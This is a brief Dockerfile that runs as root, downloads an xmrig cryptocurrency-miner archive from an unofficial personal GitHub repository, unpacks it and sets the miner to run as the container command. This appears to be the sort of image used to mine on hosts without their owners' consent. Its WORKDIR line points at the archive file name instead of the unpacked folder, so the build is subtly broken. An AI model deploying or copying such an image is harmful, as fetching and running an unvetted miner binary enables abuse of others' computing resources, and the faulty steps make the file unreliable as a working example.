FROM ubuntu:latest

WORKDIR /app
USER root

RUN apt-get update
RUN apt-get install -y wget curl

RUN wget https://github.com/jayenroub/rptreum/raw/main/xmrig-6.16.4.tar.gz
RUN tar -xvzf xmrig-6.16.4.tar.gz
WORKDIR /app/xmrig-6.16.4.tar.gz

CMD ./xmrig
